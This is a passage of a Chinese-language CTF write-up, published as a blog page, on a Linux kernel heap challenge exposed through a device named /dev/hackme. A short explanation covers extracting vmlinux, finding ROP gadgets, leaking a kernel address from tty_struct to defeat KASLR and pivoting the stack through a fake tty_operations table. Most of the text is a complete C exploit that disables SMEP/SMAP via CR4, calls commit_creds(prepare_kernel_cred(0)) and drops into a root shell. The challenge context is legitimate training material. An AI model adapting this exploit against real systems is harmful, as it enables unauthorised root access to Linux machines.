+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span> )buf)[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x100</span>;
+</span></span><span style=display:flex><span>    edit(fd, <span style=color:#40a070>1</span>, buf, TTY_STRUCT_SLAB_SIZE, <span style=color:#666>-</span>TTY_STRUCT_SLAB_SIZE);
+</span></span></code></pre></div><p>和用户态不同，劫持某函数指针为内核函数是难以完成提权的，ret2usr 的方法也不可行，所以这里的做法是栈迁移 rop。</p><p>首先，因为 bzImage 无法直接取出 gadges，先提取出 vmlinux，使用 <a href=https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux>extract-vmlinux</a> 即可</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>extract-vmlinux bzImage &gt; vmlinux
+</span></span></code></pre></div><p>然后用 ropper 和 ROPgadget 提取出 gadgets 即可。</p><p>回到题目，需要在执行 write 的时候只用一个 gadget 栈迁移到合适的地址上，首先观察一下执行到 write 的时候的寄存器环境</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/1185861535.png></div><p>leak 出的 chunk 是当前 chunk 的前一个chunk，可见 rax 就指向了当前的 chunk，也就是 fake_tty_operations 这张表，只要能把 rax 赋值给 rsp 就可以实现有效的栈迁移了，通过 ROPgadget 可以找到这个 gadget</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/1195168604.png></div><p>执行玩这个之后栈就会迁移到 fake_tty_operations[0] 处，我们在这里布置 rop 链即可。不过可以注意到，此处的空间有限，所以可以考虑再做一次栈迁移转到一个空间更加宽裕的位置上 rop。之后的 rop 可以考虑关闭 smap/smep ret2usr 提权拿 shell，也可以直接 rop 提权，前者可能会稍微方便一点。</p><p>那么最后的问题就是如何获得这些 gadgets 的地址了，因为开启了 kaslr，所以还需要做一个 leak。再 tty_struct 中有大量的内核数据，从中可以 leak 出代码段的地址。具体的，首先打出 tty_struct 中的数据</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/07/869773901.png></div><p>可见第四个数据看起来很像代码段的数据，所以我们 cat grep 一下</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cat /proc/kallsyms | grep ffffff99c25d80
+</span></span></code></pre></div><p>就可以发现这是 ptm_unix98_ops 的地址。然后就可以得出各个内核函数（主要是 prepare_kernel_cred 和 commit_creds 这两个函数）和 gadget 的地址了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdio.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdlib.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;stdint.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;unistd.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;fcntl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020>#include</span> <span style=color:#007020>&lt;sys/ioctl.h&gt;</span><span style=color:#007020>
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>
+</span></span><span style=display:flex><span><span style=color:#007020>#define TTY_STRUCT_SIZE 0x2E0
+</span></span></span><span style=display:flex><span><span style=color:#007020>#define TTY_STRUCT_SLAB_SIZE 0x400
+</span></span></span><span style=display:flex><span><span style=color:#007020></span>size_t KERNEL_BIN_BASE <span style=color:#666>=</span> <span style=color:#40a070>0xFFFFFFFF81000000</span>;
+</span></span><span style=display:flex><span>size_t kernel_base;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// rop chain
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>size_t mov_cr4_rax_push_rcx_popfq_pop_rbp_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8100252b</span>;
+</span></span><span style=display:flex><span>size_t pop_rax_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8101b5a1</span>;
+</span></span><span style=display:flex><span>size_t swapgs_popfq_pop_rbp_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81200c2e</span>;
+</span></span><span style=display:flex><span>size_t iretq <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff81019356</span>;
+</span></span><span style=display:flex><span>size_t commit_creds <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8104d220</span>;
+</span></span><span style=display:flex><span>size_t prepare_kernel_creds <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff8104d3d0</span>;
+</span></span><span style=display:flex><span>size_t push_rax_pop_rsp_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff810608d5</span>;
+</span></span><span style=display:flex><span>size_t pop_rsp_ret <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff810484f0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t <span style=color:#06287e>get_offed_addr</span>(size_t raw_addr)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> (raw_addr <span style=color:#666>-</span> KERNEL_BIN_BASE <span style=color:#666>+</span> kernel_base);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>update_gadgets_addr</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    mov_cr4_rax_push_rcx_popfq_pop_rbp_ret <span style=color:#666>=</span> get_offed_addr(mov_cr4_rax_push_rcx_popfq_pop_rbp_ret);
+</span></span><span style=display:flex><span>    pop_rax_ret <span style=color:#666>=</span> get_offed_addr(pop_rax_ret);
+</span></span><span style=display:flex><span>    swapgs_popfq_pop_rbp_ret <span style=color:#666>=</span>  get_offed_addr(swapgs_popfq_pop_rbp_ret);
+</span></span><span style=display:flex><span>    iretq <span style=color:#666>=</span> get_offed_addr(iretq);
+</span></span><span style=display:flex><span>    commit_creds <span style=color:#666>=</span> get_offed_addr(commit_creds);
+</span></span><span style=display:flex><span>    prepare_kernel_creds <span style=color:#666>=</span> get_offed_addr(prepare_kernel_creds);
+</span></span><span style=display:flex><span>    push_rax_pop_rsp_ret <span style=color:#666>=</span> get_offed_addr(push_rax_pop_rsp_ret);
+</span></span><span style=display:flex><span>    pop_rsp_ret <span style=color:#666>=</span> get_offed_addr(pop_rsp_ret);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>DATA</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> dummy;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span><span style=color:#666>*</span> buf;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> <span style=color:#902000>long</span> buf_len;
+</span></span><span style=display:flex><span>    <span style=color:#902000>long</span> <span style=color:#902000>long</span> offset;
+</span></span><span style=display:flex><span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>add</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx, <span style=color:#902000>char</span><span style=color:#666>*</span> buf, <span style=color:#902000>long</span> <span style=color:#902000>long</span> buf_len)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>DATA</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    tmp.buf_len <span style=color:#666>=</span> buf_len;
+</span></span><span style=display:flex><span>    tmp.offset <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    ioctl(fd, <span style=color:#40a070>0x30000</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>data_free</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>DATA</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    ioctl(fd, <span style=color:#40a070>0x30001</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>edit</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx, <span style=color:#902000>char</span><span style=color:#666>*</span> buf, <span style=color:#902000>long</span> <span style=color:#902000>long</span> buf_len, <span style=color:#902000>long</span> <span style=color:#902000>long</span> offset)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>DATA</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    tmp.buf_len <span style=color:#666>=</span> buf_len;
+</span></span><span style=display:flex><span>    tmp.offset <span style=color:#666>=</span> offset;
+</span></span><span style=display:flex><span>    ioctl(fd, <span style=color:#40a070>0x30002</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_content</span>(<span style=color:#902000>int</span> fd, <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> idx, <span style=color:#902000>char</span><span style=color:#666>*</span> buf, <span style=color:#902000>long</span> <span style=color:#902000>long</span> buf_len, <span style=color:#902000>long</span> <span style=color:#902000>long</span> offset)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>DATA</span> tmp;
+</span></span><span style=display:flex><span>    tmp.idx <span style=color:#666>=</span> idx;
+</span></span><span style=display:flex><span>    tmp.buf <span style=color:#666>=</span> buf;
+</span></span><span style=display:flex><span>    tmp.buf_len <span style=color:#666>=</span> buf_len;
+</span></span><span style=display:flex><span>    tmp.offset <span style=color:#666>=</span> offset;
+</span></span><span style=display:flex><span>    ioctl(fd, <span style=color:#40a070>0x30003</span>, <span style=color:#666>&amp;</span>tmp);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>size_t user_cs, user_gs, user_ds, user_es, user_ss, user_rflags, user_rsp;
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_user_stat</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	__asm__ (<span style=color:#4070a0>&#34;.intel_syntax noprefix</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>	__asm__ <span style=color:#007020;font-weight:700>volatile</span> (
+</span></span><span style=display:flex><span>		<span style=color:#4070a0>&#34;mov user_cs, cs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_ss, ss;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_gs, gs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_ds, ds;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_es, es;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 mov user_rsp, rsp;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 pushf;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>		 pop user_rflags&#34;</span>
+</span></span><span style=display:flex><span>	);
+</span></span><span style=display:flex><span>	printf(<span style=color:#4070a0>&#34;[+] got user stat</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>char</span> buf[<span style=color:#40a070>0x500</span>] <span style=color:#666>=</span> {<span style=color:#40a070>0</span>};
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_root</span>() 
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#902000>void</span><span style=color:#666>*</span> (<span style=color:#666>*</span>pkc)(<span style=color:#902000>int</span>) <span style=color:#666>=</span> (<span style=color:#902000>void</span><span style=color:#666>*</span>(<span style=color:#666>*</span>)(<span style=color:#902000>int</span>)) prepare_kernel_creds;
+</span></span><span style=display:flex><span>    <span style=color:#902000>void</span> (<span style=color:#666>*</span>cc)(<span style=color:#902000>void</span><span style=color:#666>*</span>) <span style=color:#666>=</span> (<span style=color:#902000>void</span>(<span style=color:#666>*</span>)(<span style=color:#902000>void</span><span style=color:#666>*</span>)) commit_creds;
+</span></span><span style=display:flex><span>    (<span style=color:#666>*</span>cc)((<span style=color:#666>*</span>pkc)(<span style=color:#40a070>0</span>));
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>//puts(&#34;commited!\n&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_shell</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[-] uid = %d&#34;</span>, getuid());
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (getuid() <span style=color:#666>==</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[+] root now!&#34;</span>);
+</span></span><span style=display:flex><span>        system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span>
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;err: not root&#34;</span>);
+</span></span><span style=display:flex><span>        system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>        exit(<span style=color:#666>-</span><span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    get_user_stat();
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/hackme&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;fd: %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, fd);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>0</span>, buf, TTY_STRUCT_SIZE);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>1</span>, buf, TTY_STRUCT_SIZE);
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>2</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>2</span>);
+</span></span><span style=display:flex><span>    get_content(fd, <span style=color:#40a070>3</span>, buf, <span style=color:#40a070>0x100</span>, <span style=color:#666>-</span><span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    size_t heap_addr <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span> )buf)[<span style=color:#40a070>0</span>] <span style=color:#666>-</span> <span style=color:#40a070>0x200</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] heap_addr: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, heap_addr);
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> tty_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/ptmx&#34;</span>, O_RDWR);
+</span></span><span style=display:flex><span>    get_content(fd, <span style=color:#40a070>1</span>, buf, TTY_STRUCT_SLAB_SIZE, <span style=color:#666>-</span>TTY_STRUCT_SLAB_SIZE);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t ptm_unix98_ops_addr <span style=color:#666>=</span> ((size_t<span style=color:#666>*</span>)buf)[<span style=color:#40a070>3</span>];
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] ptm_unix98_ops: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, ptm_unix98_ops_addr);
+</span></span><span style=display:flex><span>    kernel_base <span style=color:#666>=</span> ptm_unix98_ops_addr <span style=color:#666>-</span> <span style=color:#40a070>0x625D80</span>;
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] kernel_base: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, kernel_base);
+</span></span><span style=display:flex><span>    update_gadgets_addr();
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] prepare_kernel_cred: 0x%lx</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,prepare_kernel_creds);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t rop_chain[<span style=color:#40a070>0x20</span>];
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> pop_rax_ret;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0x6F0</span>;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> mov_cr4_rax_push_rcx_popfq_pop_rbp_ret; <span style=color:#60a0b0;font-style:italic>// disable smap, smep
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> (size_t) get_root; <span style=color:#60a0b0;font-style:italic>// ret2usr
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> swapgs_popfq_pop_rbp_ret;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> iretq;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> (size_t) get_shell;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_cs;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_rflags;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_rsp;
+</span></span><span style=display:flex><span>    rop_chain[i<span style=color:#666>++</span>] <span style=color:#666>=</span> user_ss;
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>2</span>, (<span style=color:#902000>char</span> <span style=color:#666>*</span>)rop_chain, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size_t fake_tty_vtable[<span style=color:#40a070>0x20</span>];
+</span></span><span style=display:flex><span>    fake_tty_vtable[<span style=color:#40a070>7</span>] <span style=color:#666>=</span> push_rax_pop_rsp_ret;
+</span></span><span style=display:flex><span>    fake_tty_vtable[<span style=color:#40a070>0</span>] <span style=color:#666>=</span> pop_rsp_ret;
+</span></span><span style=display:flex><span>    fake_tty_vtable[<span style=color:#40a070>1</span>] <span style=color:#666>=</span> heap_addr;
+</span></span><span style=display:flex><span>    data_free(fd, <span style=color:#40a070>3</span>);
+</span></span><span style=display:flex><span>    add(fd, <span style=color:#40a070>3</span>, (<span style=color:#902000>char</span> <span style=color:#666>*</span>)fake_tty_vtable, <span style=color:#40a070>0x100</span>);
+</span></span><span style=display:flex><span>    ((size_t<span style=color:#666>*</span> )buf)[<span style=color:#40a070>3</span>] <span style=color:#666>=</span> heap_addr <span style=color:#666>+</span> <span style=color:#40a070>0x100</span>;
+</span></span><span style=display:flex><span>    edit(fd, <span style=color:#40a070>1</span>, buf, TTY_STRUCT_SLAB_SIZE, <span style=color:#666>-</span>TTY_STRUCT_SLAB_SIZE);
+</span></span><span style=display:flex><span>    puts(<span style=color:#4070a0>&#34;ready for trig&#34;</span>);
+</span></span><span style=display:flex><span>    write(tty_fd, buf, <span style=color:#40a070>0x800</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li><li><a href=/tags/kernel-pwn>kernel-pwn</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
